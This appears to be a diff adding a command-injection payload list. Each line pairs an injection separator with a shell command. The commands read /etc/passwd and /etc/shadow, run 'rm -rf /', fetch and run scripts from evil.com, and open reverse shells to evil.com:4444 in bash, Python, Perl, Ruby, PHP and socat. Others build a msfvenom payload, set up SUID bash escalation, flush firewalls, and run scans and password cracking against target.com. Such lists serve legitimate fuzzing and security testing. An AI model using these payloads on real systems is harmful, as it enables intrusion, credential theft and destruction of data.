@@ -1,0 +1,73 @@
+; cat /etc/passwd
+| cat /etc/shadow
+`cat /etc/hostname`
+$(cat /etc/passwd)
+; rm -rf /
+| curl http://evil.com/shell.sh | sh
+`wget http://evil.com/backdoor`
+$(bash -i >& /dev/tcp/evil.com/4444 0>&1)
+; nc -e /bin/sh evil.com 4444
+| python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+; ls -la
+| whoami
+`id`
+$(uname -a)
+; id
+| cat /etc/passwd
+`cat /etc/issue`
+$(hostname)
+; wget http://evil.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor
+| python -c 'import pty;pty.spawn("/bin/bash")'
+`curl http://evil.com/shell.sh | bash`
+$(perl -e 'system("id")')
+; echo "hacked" > /tmp/pwned
+| telnet evil.com 4444
+`ncat evil.com 4444 -e /bin/bash`
+$(php -r 'system("id");')
+; ruby -e 'exec "id"'
+| python -c 'print("pwned")'
+`php -r "system('cat /etc/passwd');"`
+$(ruby -e 'system("cat /etc/shadow")')
+; lua -e 'os.execute("id")'
+| node -e 'require("child_process").execSync("id")'
+`perl -e 'system("cat /etc/passwd")'`
+$(java -version 2>&1)
+; tftp evil.com GET shell.sh
+| ftp evil.com
+`script -qc "bash -i" >& /dev/tcp/evil.com/4444 0>&1`
+$(python -c 'import base64;print(base64.b64encode(open("/etc/passwd").read()))')
+; openssl s_client -connect evil.com:4444
+| socat TCP:evil.com:4444 EXEC:/bin/sh
+`msfvenom -p linux/x64/shell_reverse_tcp LHOST=evil.com LPORT=4444 -f elf -o /tmp/shell`
+$(gcc -o /tmp/shell shell.c && /tmp/shell)
+; cp /bin/bash /tmp/suidbash && chmod u+s /tmp/suidbash
+| chmod +s /bin/bash
+`/bin/bash -p`
+$(/bin/sh -i)
+; /bin/bash -c 'exec bash -i >& /dev/tcp/evil.com/4444 0>&1'
+| bash -c 'exec bash -i >& /dev/tcp/evil.com/4444 0>&1'
+`bash -c 'exec bash -i >& /dev/tcp/evil.com/4444 0>&1'`
+$(bash -c 'exec bash -i >& /dev/tcp/evil.com/4444 0>&1')
+; php -r '$sock=fsockopen("evil.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+| python -c 'import socket,subprocess;s=socket.socket();s.connect(("evil.com",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+`perl -e 'use Socket;$i="evil.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+$(ruby -rsocket -e 'exit if fork;c=TCPSocket.new("evil.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end')
+; sqlmap -u http://target.com --batch --dbs
+| nmap -p 1-65535 target.com
+`nikto -h target.com`
+$(dirb http://target.com)
+; gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+| wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt http://target.com/FUZZ
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com ssh`
+$(john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt)
+; hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+| /usr/sbin/tcpdump -i eth0 -w capture.pcap
+`iptables -F`
+$(echo 1 > /proc/sys/net/ipv4/ip_forward)
+; sysctl -w net.ipv4.ip_forward=1
+| service iptables stop
+`/etc/init.d/network stop`
+$(modprobe -r nouveau)
+; chmod 777 /etc/shadow
+| chown root:root /etc/passwd
+`mount -o remount,rw /`
